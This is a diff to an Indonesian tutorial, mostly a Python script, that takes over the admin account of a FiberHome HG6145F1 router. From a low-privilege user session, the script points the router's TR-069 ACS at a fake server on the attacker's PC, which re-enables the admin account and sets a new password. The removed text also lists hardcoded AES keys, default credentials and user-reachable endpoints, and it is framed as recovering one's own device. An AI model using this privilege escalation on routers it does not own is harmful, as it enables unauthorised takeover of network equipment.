@@ -1,91 +1,3 @@
-# FiberHome HG6145F1 — Admin Account Recovery via Fake ACS + CWMP
-
-> **⚠️ Device-specific.** This tutorial is for the **FiberHome HG6145F1** (ONT/router by Telkom Indonesia). You need:
-> - A FiberHome HG6145F1 router
-> - A Windows PC connected to it (WiFi or LAN)
-> - Working `user` credentials (default: `user` / `user1234`)
-
----
-
-## Isi
-
-1. [Apa Yang Terjadi?](#apa-yang-terjadi)
-2. [Persiapan (Windows)](#persiapan-windows)
-3. [Cara Kerja](#cara-kerja)
-4. [Jalankan — Satu Klik](#jalankan--satu-klik)
-5. [Verifikasi](#verifikasi)
-6. [Setelah Berhasil](#setelah-berhasil)
-7. [Referensi Endpoint](#referensi-endpoint)
-
----
-
-## Apa Yang Terjadi?
-
-ACS (server TR-069 dari ISP) bisa remote router kamu dan:
-
-1. **Mematikan akun admin** (`Enable=0`) — semua password balik `login_result: 4`
-2. **Mengganti password admin** — via parameter `WebSuperPassword`
-3. Akun `user` masih bisa dipakai, tapi **tidak bisa ganti password admin** karena harus tahu password admin lama (`errorCode: -4`)
-
-Hasilnya: admin hangus total.
-
-## Cara Kerja
-
-Kita manfaatin fitur TR-069 itu sendiri untuk balik serang:
-
-1. Dari session `user`, kita ubah alamat ACS router ke **server palsu** di Windows kita
-2. Kita aktifin CWMP (biar router connect ke server palsu)
-3. Kita jalankan **fake ACS server** di Windows
-4. Router connect → server palsu kirim perintah `SetParameterValues`:
-   - `Enable=1` — aktifkan akun admin lagi
-   - `WebSuperPassword=admin123` — set password baru
-5. Router terima & simpan → admin pulih
-6. Bersih-bersih: balikin URL ACS asli, matikan CWMP lagi
-
-## Persiapan (Windows)
-
-### 1. Install Python (kalau belum ada)
-
-Buka **PowerShell** (Run as Administrator), jalankan:
-
-```powershell
-# Cek apakah Python sudah ada
-python --version
-# Kalau muncul "not recognized", download dari:
-# https://www.python.org/downloads/
-# Install, pastikan centang "Add Python to PATH"
-```
-
-### 2. Install library yang dibutuhkan
-
-```powershell
-pip install requests pycryptodome
-```
-
-### 3. Cari IP Windows kamu
-
-```powershell
-ipconfig
-# Cari baris "IPv4 Address" di adapter yang connect ke router
-# Biasanya 192.168.1.x (misal: 192.168.1.3)
-```
-
-### 4. Simpan script
-
-Buka Notepad, copy-paste script di bawah, simpan sebagai `recover_admin.py` di `C:\recover_admin.py`.
-
-Atau langsung dari PowerShell:
-
-```powershell
-New-Item -ItemType Directory -Path C:\fh_recovery -Force
-Set-Location C:\fh_recovery
-```
-
-## Jalankan — Satu Klik
-
-Buat file `C:\fh_recovery\recover_admin.py` dengan isi berikut:
-
-```python
 import socket, re, requests, random, threading, time
 from Crypto.Cipher import AES
 
@@ -208,7 +120,6 @@ def run_acs():
         else:
             print(f"[ACS] Response: {d.decode(errors='replace')[:200]}")
 
-        # Tutup sesi
         conn.sendall(http_resp(SOAP_END).encode())
         conn.close()
     except socket.timeout:
@@ -222,11 +133,10 @@ def setup_router():
     s = requests.Session()
     s.headers["User-Agent"] = "Mozilla/5.0"
 
-    # Login sebagai user
     s.get(f"http://{ROUTER_IP}/fh", timeout=10)
     r = s.get(f"http://{ROUTER_IP}/cgi-bin/ajax?ajaxmethod=get_refresh_sessionid&_=1", timeout=10)
     sid = r.json()["sessionid"]
-    s.post(f"http://{ROUTER_IP}/cgi-bin/ajax",
+    r = s.post(f"http://{ROUTER_IP}/cgi-bin/ajax",
         data=f"username=user&loginpd={enc(USER_PASS)}&port=0&sessionid={sid}&ajaxmethod=do_login",
         headers={"Content-Type":"application/x-www-form-urlencoded"}, timeout=10)
     print(f"[CLIENT] Login user: {r.json().get('login_result')}")
@@ -235,7 +145,6 @@ def setup_router():
         r = s.get(f"http://{ROUTER_IP}/cgi-bin/ajax?ajaxmethod=get_refresh_sessionid&_={random.random()}", timeout=10)
         return r.json()["sessionid"]
 
-    # Ubah URL ACS ke server palsu
     sid = gsid()
     s.post(f"http://{ROUTER_IP}/cgi-bin/ajax",
         data=f"ajaxmethod=set_tr69_info&sessionid={sid}&method=info"
@@ -244,7 +153,6 @@ def setup_router():
         headers={"Content-Type":"application/x-www-form-urlencoded"}, timeout=10)
     print(f"[CLIENT] ACS URL diarahkan ke http://{PC_IP}:{ACS_PORT}/")
 
-    # Aktifkan CWMP
     sid = gsid()
     s.post(f"http://{ROUTER_IP}/cgi-bin/ajax",
         data=f"ajaxmethod=set_tr69_info&sessionid={sid}&method=enable&EnableCWMP=1",
@@ -289,18 +197,13 @@ print("=" * 50)
 print("FiberHome HG6145F1 — Admin Recovery")
 print("=" * 50)
 
-# Setup router (dari session user)
 session_user = setup_router()
 
-# Jalankan fake ACS server di thread terpisah
 t = threading.Thread(target=run_acs, daemon=True)
 t.start()
-
-# Tunggu sampai selesai
 t.join(timeout=120)
 time.sleep(2)
 
-# Verifikasi admin login
 lr, data = verify()
 if lr == 0:
     print(f"\n✅✅✅ ADMIN BERHASIL DIPULIHKAN! ✅✅✅")
@@ -310,155 +213,5 @@ else:
     print(f"\n❌ Admin masih gagal (login_result: {lr})")
     print(f"   Response: {data}")
 
-# Cleanup
 cleanup(session_user)
 print("\nSelesai!")
-```
-
-### Ganti IP Windows kamu!
-
-Di script di atas, **ganti baris ini** dengan IP Windows kamu:
-
-```python
-PC_IP = "192.168.1.3"  # ← GANTI dengan IP Windows kamu!
-```
-
-Cek IP kamu di PowerShell:
-
-```powershell
-ipconfig
-# Cari: IPv4 Address. . . . . . . . . . : 192.168.1.x
-```
-
-### Jalankan!
-
-```powershell
-cd C:\fh_recovery
-python recover_admin.py
-```
-
-Tunggu 10-30 detik. Kalau berhasil, output akan seperti:
-
-```
-[ACS] Menunggu koneksi dari router di port 19090...
-[CLIENT] Login user: 0
-[CLIENT] ACS URL diarahkan ke http://192.168.1.3:19090/
-[CLIENT] CWMP diaktifkan...
-[ACS] Router connect dari ('10.5.72.61', 35692)
-[ACS] Terima Inform, ID=1154693594
-[ACS] Kirim perintah: Enable=1, password=admin123
-[ACS] ✅ Router MENERIMA perintah!
-
-✅✅✅ ADMIN BERHASIL DIPULIHKAN! ✅✅✅
-   Username: admin
-   Password: admin123
-```
-
-## Setelah Berhasil
-
-### Ganti password admin (kalau mau)
-
-Dari session admin, kamu bisa ganti password kapan aja:
-
-```python
-import requests, random
-from Crypto.Cipher import AES
-
-ROUTER_IP = "192.168.1.1"
-KEY = bytes([i + 0x6f for i in range(16)])
-
-def enc(pwd):
-    c = AES.new(KEY, AES.MODE_CBC, KEY)
-    r = pwd.encode()
-    p = 16 - (len(r) % 16)
-    return c.encrypt(r + bytes([p] * p)).hex().upper()
-
-s = requests.Session()
-s.get(f"http://{ROUTER_IP}/fh")
-sid = s.get(f"http://{ROUTER_IP}/cgi-bin/ajax?ajaxmethod=get_refresh_sessionid&_=1").json()["sessionid"]
-s.post(f"http://{ROUTER_IP}/cgi-bin/ajax",
-    data=f"username=admin&loginpd={enc('admin123')}&port=0&sessionid={sid}&ajaxmethod=do_login",
-    headers={"Content-Type":"application/x-www-form-urlencoded"})
-
-sid = s.get(f"http://{ROUTER_IP}/cgi-bin/ajax?ajaxmethod=get_refresh_sessionid&_=r").json()["sessionid"]
-r = s.post(f"http://{ROUTER_IP}/cgi-bin/ajax",
-    data=f"ajaxmethod=admin_management&sessionid={sid}"
-         f"&username=admin"
-         f"&old_password={enc('admin123')}"
-         f"&new_password={enc('password_baru_kamu')}",
-    headers={"Content-Type":"application/x-www-form-urlencoded"})
-print(r.json())  # {"session_valid": 1, "success": "true"}
-```
-
-### Matikan TR-069 biar ACS gak bisa lock lagi
-
-Dari session user atau admin:
-
-```python
-sid = <fresh sessionid>
-s.post(f"http://{ROUTER_IP}/cgi-bin/ajax",
-    data=f"ajaxmethod=set_tr69_info&sessionid={sid}&method=enable&EnableCWMP=0",
-    headers={"Content-Type":"application/x-www-form-urlencoded"})
-```
-
-## Kenapa Ini Bisa?
-
-### 1. Password dikirim PLAINTEXT, bukan AES
-
-Di `SetParameterValues`, nilai `WebSuperPassword` harus **plaintext** (contoh: `admin123`), bukan yang sudah di-AES:
-
-```xml
-<!-- BENAR: plaintext -->
-<Value xsi:type="xsd:string">admin123</Value>
-
-<!-- SALAH: CPE akan double-encrypt -->
-<Value xsi:type="xsd:string">A1E5D34022767688617CC9FBC0AEE256</Value>
-```
-
-Router pake AES-128-ECB key `ABCDEFGHIJKLMNOP` untuk encrypt password sebelum simpan ke config. Kalau kirim yang udah diencrypt, nanti diencrypt lagi → jadinya rusak.
-
-### 2. Admin account bisa di-DISABLE oleh ACS
-
-ACS bisa set `Enable=0` — ini bikin SEMUA password return `login_result: 4` (akun dimatiin, bukan password salah). Makanya kita kirim `Enable=1` bareng passwordnya.
-
-### 3. Dua jenis AES berbeda
-
-| Fungsi | Algoritma | Key |
-|--------|-----------|-----|
-| Login web & admin_management | AES-128-CBC | `opqrstuvwxyz{|}~` |
-| Penyimpanan config (WebSuperPassword) | AES-128-ECB | `ABCDEFGHIJKLMNOP` |
-
-### 4. Alur CWMP
-
-```
-Router → ACS: Kirim Inform (data device)
-ACS → Router: Balas InformResponse
-Router → ACS: Kirim POST kosong (siap terima command)
-ACS → Router: Kirim SetParameterValues (Enable=1, password baru)
-Router → ACS: Balas SetParameterValuesResponse (OK)
-ACS → Router: Kirim envelope kosong (sesi selesai)
-```
-
-## Catatan Penting
-
-- **TR-069 jalan dari WAN** — router connect ke fake ACS dari IP WAN (10.5.x.x), bukan LAN. Tapi karena NAT di router mengizinkan, koneksi dari WAN ke LAN tetep tembus.
-- **Firewall Windows** — kalau fake ACS gak keneksi, matikan firewall sementara atau buka port 19090:
-  ```powershell
-  netsh advfirewall firewall add rule name="FakeACS" dir=in action=allow protocol=TCP localport=19090
-  ```
-- **Tunggu 10-30 detik** — router butuh waktu untuk initiate koneksi ke fake ACS (interval inform kita set 10 detik).
-
-## Referensi Endpoint
-
-| Endpoint | Method | Fungsi | Bisa dari |
-|----------|--------|--------|-----------|
-| `do_login` | POST | Login | public |
-| `set_tr69_info` | POST | Ubah ACS URL, enable/disable CWMP | user, admin |
-| `get_tr69_info` | POST | Lihat konfigurasi TR-069 | user, admin |
-| `admin_management` | POST | Ganti password admin | user, admin |
-| `setWlanControl` | POST | Atur WiFi (TX power, SSID) | user, admin |
-| `getWlanControl` | POST | Baca konfigurasi WiFi | user, admin |
-
----
-
-> **Disclaimer**: Tutorial ini untuk tujuan edukasi dan riset keamanan perangkat sendiri. Gunakan dengan bijak.
